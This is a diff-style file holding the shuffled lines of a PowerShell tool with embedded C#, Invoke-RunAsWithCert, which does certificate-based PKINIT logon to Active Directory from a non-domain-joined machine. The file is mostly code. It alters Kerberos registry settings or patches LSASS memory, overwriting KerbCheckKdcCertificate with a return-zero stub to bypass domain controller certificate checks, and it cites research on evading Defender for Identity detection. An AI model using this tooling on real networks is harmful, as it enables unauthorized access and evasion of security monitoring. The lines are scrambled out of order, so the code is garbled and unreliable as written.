@@ -1,0 +1,423 @@
+    
+        
+            
+                    out written
+                (uint)processes[0].Id
+                )
+                CloseHandle(hProcess)
+                PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION 
+                bool status = WriteProcessMemory(
+                if (!status)
+                int written
+                out pi
+                out read
+                out written
+                store.Add(cert)
+                store.Open(OpenFlags.ReadWrite)
+                {
+                }
+            )
+            -----------
+            CloseHandle(pi.hProcess)
+            CloseHandle(pi.hThread)
+            Create a new logon session with the specified certificate and run cmd.exe.
+            Create a new logon session with the specified certificate and run powershell.exe.
+            Create a new logon session with the specified password protected certificate and run powershell.exe.
+            Creates a new logon session with the specified certificate.
+            Description
+            Invoke-RunAsWithCert user.pfx -Domain CORP.LOCAL
+            Invoke-RunAsWithCert user.pfx -Domain CORP.LOCAL -Command cmd.exe
+            Invoke-RunAsWithCert user.pfx -Domain CORP.LOCAL -Password password123
+            Invoke-RunAsWithCert user.pfx -Domain CORP.LOCAL -PatchLsass
+            It is meant to be run on a non domain-joined VM. The cmdlet has two modes: one that sets
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION()
+            Patch LSASS and create a new logon session with the specified certificate.
+            Patch LSASS memory instead of using the registry.
+            STARTUPINFO si = new STARTUPINFO()
+            The Active Directory domain to authenticate to.
+            The certificate password.
+            The certificate to use for PKINIT authentication
+            The command to execute in the new logon session.
+            The path to dbghelp.dll installed with the Windows SDK.
+            This cmdlet creates a new logon session with the specified certificate via PKINIT.
+            _NT_SYMBOL_PATH needs to be defined (e.g. SRV
+            bool status = CreateProcessWithLogonW(
+            bool status = ReadProcessMemory(
+            but will bypass any client-side check related to the KDC certificate.
+            hProcess = OpenProcess(
+            if (!status)
+            if ($standaloneKdcValidation -eq $null) {
+            if ($standaloneKdcValidation -ne 0) {
+            if ($useCachedCRLOnlyAndIgnoreRevocationUnknownErrors -eq $null) {
+            if ($useCachedCRLOnlyAndIgnoreRevocationUnknownErrors -ne 1) {
+            if (hProcess == IntPtr.Zero)
+            if (patchLsass) {
+            if (processes.Length == 0)
+            int read
+            int written
+            is not joined to the domain.
+            look in C:
+            name = name.Split('@')[0]
+            needs (dbghelp.dll and symsrv.dll).
+            registry keys and one that patches LSASS memory to bypass client-side checks related
+            si.cb = (uint)Marshal.SizeOf(si)
+            status = WriteProcessMemory(
+            string username = MarshalCertificate(cert)
+            throw
+            to the domain controller's certificate. These checks fail when running on a machine that
+            trusted certification authorities. If this method fails (e.g. because of a check that is not
+            using (X509Store store = new X509Store(StoreName.My))
+            {
+            }
+            } elseif ($standaloneKdcValidation -ne 0) {
+            } elseif ($useCachedCRLOnlyAndIgnoreRevocationUnknownErrors -ne 1) {
+         .EXAMPLE
+        .DESCRIPTION
+        .EXAMPLE
+        .EXAMPLE  
+        .PARAMETER Certificate
+        .PARAMETER Command
+        .PARAMETER DbgHelpPath
+        .PARAMETER Domain
+        .PARAMETER Password
+        .PARAMETER PatchLsass
+        .SYNOPSIS
+        Add-Type -TypeDefinition $Source -Language CSharp
+        CERT_CREDENTIAL_INFO certInfo = new CERT_CREDENTIAL_INFO()
+        CredFree(marshaledCredential)
+        FreeLibrary(baseAddress)
+        FreeLibrary(pDll)
+        IntPtr address = IntPtr.Zero
+        IntPtr baseAddress = LoadLibrary(library)
+        IntPtr buffer
+        IntPtr hLibModule
+        IntPtr hProcess
+        IntPtr hProcess = IntPtr.Zero
+        IntPtr hProcess = Process.GetCurrentProcess().SafeHandle.DangerousGetHandle()
+        IntPtr handle
+        IntPtr marshaledCredential = IntPtr.Zero
+        IntPtr pCertInfo = Marshal.AllocHGlobal(Marshal.SizeOf(certInfo))
+        IntPtr pDll = LoadLibrary(dbghelp)
+        Marshal.FreeHGlobal(pCertInfo)
+        SYMBOL_INFO symbolInfo = new SYMBOL_INFO()
+        SymCleanup(hProcess)
+        UsernameTargetCredential
+        [Parameter()]
+        [Parameter(Mandatory = $True)]
+        [String]
+        [Switch]
+        bool fInvadeProcess
+        byte[] backup = new byte[3]
+        catch
+        certInfo.cbSize = (uint)Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO))
+        certInfo.rgbHashOfCert = cert.GetCertHash()
+        else
+        finally
+        if (!$PatchLsass.IsPresent) {
+        if (!result)
+        if (!status)
+        if (String.IsNullOrEmpty(name))
+        if (address == IntPtr.Zero)
+        if (baseAddress == IntPtr.Zero)
+        if (imageBase == 0)
+        if (pDll == IntPtr.Zero)
+        if (patchLsass) {
+        int Flags
+        out IntPtr Credential
+        out IntPtr MarshaledCredential
+        out PROCESS_INFORMATION lpProcessInformation
+        out SYMBOL_INFO Symbol
+        out int lpNumberOfBytesRead
+        out int lpNumberOfBytesWritten
+        public IntPtr Name
+        public IntPtr hProcess
+        public IntPtr hStdError
+        public IntPtr hStdInput
+        public IntPtr hStdOutput
+        public IntPtr hThread
+        public IntPtr lpReserved2
+        public IntPtr lpSecurityDescriptor
+        public bool bInheritHandle
+        public byte[] rgbHashOfCert
+        public short cbReserved2
+        public short wShowWindow
+        public string lpDesktop
+        public string lpReserved
+        public string lpTitle
+        public uint Flags
+        public uint Index
+        public uint MaxNameLen
+        public uint NameLen
+        public uint Register
+        public uint Scope
+        public uint Size
+        public uint SizeOfStruct
+        public uint Tag
+        public uint TypeIndex
+        public uint cb
+        public uint cbSize
+        public uint dwFillAttribute
+        public uint dwFlags
+        public uint dwProcessId
+        public uint dwThreadId
+        public uint dwX
+        public uint dwXCountChars
+        public uint dwXSize
+        public uint dwY
+        public uint dwYCountChars
+        public uint dwYSize
+        public uint nLength
+        public ulong Address
+        public ulong ModBase
+        public ulong Reserved1
+        public ulong Reserved2
+        public ulong Value
+        return (IntPtr)functionAddress
+        return name
+        return username
+        string dllToLoad
+        string procedureName
+        string username = Marshal.PtrToStringUni(marshaledCredential)
+        symbolInfo.SizeOfStruct = (uint)Marshal.SizeOf(typeof(SYMBOL_INFO))
+        throw
+        try
+        uint dwProcessId
+        ulong functionAddress = (ulong)baseAddress 
+        {
+        }
+    $standaloneKdcValidation = (Get-ItemProperty -Path $paramPath).StandaloneKdcValidation
+    $useCachedCRLOnlyAndIgnoreRevocationUnknownErrors = (Get-ItemProperty -Path $paramPath).UseCachedCRLOnlyAndIgnoreRevocationUnknownErrors
+    (
+    )
+    // Taken from https://github.com/bongiovimatthew-microsoft/pscredentialWithCert/blob/master/SmartcardLogon/Program.cs
+    <
+    Param
+    [CmdletBinding()]
+    [Flags]
+    [StructLayout(LayoutKind.Sequential)]
+    const int CREATE_NEW_CONSOLE = 0x00000010
+    const int LOGON_NETCREDENTIALS_ONLY = 2
+    private delegate bool FnSymCleanup(
+    private delegate bool FnSymFromName(
+    private delegate bool FnSymInitialize(
+    private delegate ulong FnSymLoadModuleEx(
+    public enum CRED_MARSHAL_TYPE
+    public enum PROCESS_ACCESS_RIGHTS : uint
+    public static extern IntPtr OpenProcess(
+    public struct SYMBOL_INFO
+    static extern IntPtr GetProcAddress(
+    static extern IntPtr LoadLibrary(
+    static extern bool CloseHandle(
+    static extern bool CreateProcessWithLogonW(
+    static extern bool CredFree(
+    static extern bool CredMarshalCredential(
+    static extern bool CredUnmarshalCredential(
+    static extern bool FreeLibrary(
+    static extern bool ReadProcessMemory(
+    static extern bool WriteProcessMemory(
+    static string MarshalCertificate(X509Certificate2 cert)
+    static string NameFromCert(X509Certificate2 cert)
+    struct CERT_CREDENTIAL_INFO
+    struct PROCESS_INFORMATION
+    struct SECURITY_ATTRIBUTES
+    struct STARTUPINFO
+    try {
+    {
+    }
+    } catch {
+    } finally {
+ Description
+ Invoke-RunAsWithCert
+ PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ 
+ RET
+ Usage
+ and 
+ function in LSASS will be patched.
+ is not exported by 
+ needs to be defined (e.g. 
+ symbolInfo.Address - imageBase
+ to find the DLLs it
+"                    3,"
+"                    address,"
+"                    backup,"
+"                    hProcess,"
+"                    throw new Exception(string.Format(""WriteProcessMemory failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"                3,"
+"                CREATE_NEW_CONSOLE,"
+"                Console.WriteLine(""Restored lsass memory"")"
+"                IntPtr.Zero,"
+"                LOGON_NETCREDENTIALS_ONLY,"
+"                Remove-ItemProperty -Path $paramPath -Name ""StandaloneKdcValidation"""
+"                Remove-ItemProperty -Path $paramPath -Name ""UseCachedCRLOnlyAndIgnoreRevocationUnknownErrors"""
+"                Set-ItemProperty -Path $paramPath -Name ""StandaloneKdcValidation"" -Value $standaloneKdcValidation"
+"                Set-ItemProperty -Path $paramPath -Name ""StandaloneKdcValidation"" -Value 0 -ErrorAction Stop"
+"                Set-ItemProperty -Path $paramPath -Name ""UseCachedCRLOnlyAndIgnoreRevocationUnknownErrors"" -Value $useCachedCRLOnlyAndIgnoreRevocationUnknownErrors"
+"                Set-ItemProperty -Path $paramPath -Name ""UseCachedCRLOnlyAndIgnoreRevocationUnknownErrors"" -Value 1 -ErrorAction Stop"
+"                address,"
+"                backup,"
+"                command,"
+"                domain,"
+"                false,"
+"                hProcess,"
+"                null,"
+"                patch,"
+"                ref si,"
+"                throw new Exception(""Process lsass.exe not found"")"
+"                throw new Exception(string.Format(""CreateProcessWithLogonW failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"                throw new Exception(string.Format(""OpenProcess failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"                throw new Exception(string.Format(""ReadProcessMemory failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"                throw new Exception(string.Format(""WriteProcessMemory failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"                username,"
+"            As KerbCheckKdcCertificate is not exported by kerberos.dll, symbols need to be retrieved."
+"            Console.WriteLine(""Patched lsass memory"")"
+"            Default: """""
+"            Default: ""C:"
+"            Default: ""powershell.exe"""
+"            For the symbols to be automatically retrieved by this cmdlet, the environment variable "
+"            If the symbols are not already on disk, an Internet connection is needed to download them."
+"            In patch mode (-PatchLsass), the KerbCheckKdcCertificate function in LSASS will be patched."
+"            In registry mode (the default), administrator privileges are needed to set the relevant"
+"            Process[] processes = Process.GetProcessesByName(""lsass"")"
+"            The Windows SDK is also needed to download the symbols. By default, the script will"
+"            X509Certificate2 cert = new X509Certificate2(certificate, password, X509KeyStorageFlags.PersistKeySet)"
+"            address = GetFunctionAddress(@""C:"
+"            bypassed with the registry keys), the patch method can be tried instead. It is less elegant"
+"            byte[] patch = new byte[3] { 0x33, 0xC0, 0xC3 }"
+"            name = cert.GetNameInfo(X509NameType.DnsName, false).Split('.')[0] "
+"            privileges are not required. Moreover, the CA certificate must be added to the list of"
+"            registry keys (and restore them at the end). If the keys are already set, administrator"
+"            si.lpTitle = string.Format(""{0} (running as {1}"
+"            throw new Exception(string.Format(""CredMarshalCredential failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"            throw new Exception(string.Format(""GetProcAddress failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"            throw new Exception(string.Format(""LoadLibrary failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"            throw new Exception(string.Format(""SymFromName failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"            throw new Exception(string.Format(""SymInitialize failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"            throw new Exception(string.Format(""SymLoadModuleEx failed with error code: 0x{0:X}"", Marshal.GetLastWin32Error()))"
+"        $Certificate,"
+"        $Command = ""powershell.exe"","
+"        $DbgHelpPath = ""C:"
+"        $Domain,"
+"        $Password = """","
+"        $PatchLsass,"
+"        CRED_MARSHAL_TYPE CredType,"
+"        CertCredential = 1,"
+"        Console.WriteLine(String.Format(""Retrieving symbols for {0}..."", library))"
+"        Console.WriteLine(String.Format(""{0} offset: 0x{1:X}"", functionName, symbolInfo.Address))"
+"        Console.WriteLine(string.Format(""Base address: 0x{0:X}"", (UInt64)baseAddress))"
+"        Console.WriteLine(string.Format(""ImageBase: 0x{0:X}"", imageBase))"
+"        Console.WriteLine(string.Format(""{0} address: 0x{1:X}"", functionName, functionAddress))"
+"        FnSymCleanup SymCleanup = (FnSymCleanup)Marshal.GetDelegateForFunctionPointer(address, typeof(FnSymCleanup))"
+"        FnSymFromName SymFromName = (FnSymFromName)Marshal.GetDelegateForFunctionPointer(address, typeof(FnSymFromName))"
+"        FnSymInitialize SymInitialize = (FnSymInitialize)Marshal.GetDelegateForFunctionPointer(address, typeof(FnSymInitialize))"
+"        FnSymLoadModuleEx SymLoadModuleEx = (FnSymLoadModuleEx)Marshal.GetDelegateForFunctionPointer(address, typeof(FnSymLoadModuleEx))"
+"        IntPtr Credential,"
+"        IntPtr Data,"
+"        IntPtr MarshaledCredential,"
+"        IntPtr address = GetProcAddress(pDll, ""SymInitializeW"")"
+"        IntPtr hFile,"
+"        IntPtr hModule,"
+"        IntPtr hProcess,"
+"        IntPtr lpBaseAddress,"
+"        IntPtr lpEnvironment,"
+"        Marshal.StructureToPtr(certInfo, pCertInfo, false)"
+"        PROCESS_ACCESS_RIGHTS dwDesiredAccess,"
+"        PROCESS_VM_OPERATION = 0x00000008,"
+"        PROCESS_VM_READ = 0x00000010,"
+"        PROCESS_VM_WRITE = 0x00000020,"
+"        String lpDomain,"
+"        String lpPassword,"
+"        String lpUsername,"
+"        UInt64 imageBase = SymLoadModuleEx(hProcess, IntPtr.Zero, library, null, 0, 0, IntPtr.Zero, 0)"
+"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]"
+"        [Parameter(Position = 0, Mandatory = $True)]"
+"        [RunAsWithCert]::RunAs($Certificate, $Domain, $Password, $Command, $PatchLsass.IsPresent, $DbgHelpPath)"
+"        address = GetProcAddress(pDll, ""SymCleanup"")"
+"        address = GetProcAddress(pDll, ""SymFromNameW"")"
+"        address = GetProcAddress(pDll, ""SymLoadModuleExW"")"
+"        bool bInheritHandle,"
+"        bool result = CredMarshalCredential(CRED_MARSHAL_TYPE.CertCredential, pCertInfo, out marshaledCredential)"
+"        bool status = SymInitialize(hProcess, null, false)"
+"        byte[] lpBuffer,"
+"        int DllSize,"
+"        out CRED_MARSHAL_TYPE CredType,"
+"        ref STARTUPINFO lpStartupInfo,"
+"        status = SymFromName(hProcess, functionName, out symbolInfo)"
+"        string ImageName,"
+"        string ModuleName,"
+"        string Name,"
+"        string UserSearchPath,"
+"        string lpApplicationName,"
+"        string lpCommandLine,"
+"        string lpCurrentDirectory,"
+"        string name = cert.GetNameInfo(X509NameType.UpnName, false)"
+"        uint dwCreationFlags,"
+"        uint dwLogonFlags,"
+"        uint nSize,"
+"        ulong BaseOfDll,"
+"    $paramPath = ""HKLM:"
+"    [DllImport(""advapi32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
+"    [DllImport(""advapi32.dll"", SetLastError = true)]"
+"    [DllImport(""kernel32.dll"")]"
+"    [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
+"    [DllImport(""kernel32.dll"", SetLastError = true)]"
+"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]"
+"    [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode, SetLastError = true)]"
+"    [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]"
+"    public static void RunAs(string certificate, string domain, string password, string command, bool patchLsass, string dbghelp)"
+"    static IntPtr GetFunctionAddress(string library, string functionName, string dbghelp)"
+" ""$"""
+" // XOR EAX,EAX"
+" PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE,"
+"$Source = @"""
+"), the "
+", symbols need to be retrieved."
+"For a more detailed explanation, see the associated [blogpost](https://www.synacktiv.com/publications/understanding-and-evading-microsoft-defender-for-identity-pkinit-detection)."
+"For the symbols to be automatically retrieved by this cmdlet, the environment variable "
+"If the symbols are not already on disk, an Internet connection is needed to download them."
+"In registry mode (the default), administrator privileges are needed to set the relevant"
+"Parameters"""
+"The Windows SDK is also needed to download the symbols. By default, the script will"
+"bypassed with the registry keys), the patch method can be tried instead. It is less elegant"
+"dbghelp.dll"""
+"kerberos.dll"", ""KerbCheckKdcCertificate"", dbghelp)"
+"privileges are not required. Moreover, the CA certificate must be added to the list of"
+"registry keys (and restore them at the end). If the keys are already set, administrator"
+"{2})"", command, domain, NameFromCert(cert))"
+-PatchLsass
+A PowerShell script to perform PKINIT authentication with the Windows API from a non domain-joined machine.
+Control
+CurrentControlSet
+Debuggers
+In patch mode (
+It is meant to be run on a non domain-joined VM. The cmdlet has two modes: one that sets
+KerbCheckKdcCertificate
+Kerberos
+PS > Invoke-RunAsWithCert user.pfx -Domain CORP.LOCAL
+Program Files (x86)
+SYSTEM
+System32
+This cmdlet creates a new logon session with the specified certificate via PKINIT.
+Windows
+Windows Kits
+_NT_SYMBOL_PATH
+but will bypass any client-side check related to the KDC certificate.
+dbghelp.dll
+function Invoke-RunAsWithCert
+https://msdl.microsoft.com/download/symbols
+https://msdl.microsoft.com/download/symbols).
+is not joined to the domain.
+kerberos.dll
+look in 
+needs (
+public class RunAsWithCert
+registry keys and one that patches LSASS memory to bypass client-side checks related
+symbols
+symsrv.dll
+to the domain controller's certificate. These checks fail when running on a machine that
+trusted certification authorities. If this method fails (e.g. because of a check that is not
+using System
+using System.Diagnostics
+using System.Runtime.InteropServices
+using System.Security.Cryptography.X509Certificates
+x64 to find the DLLs it
+{   
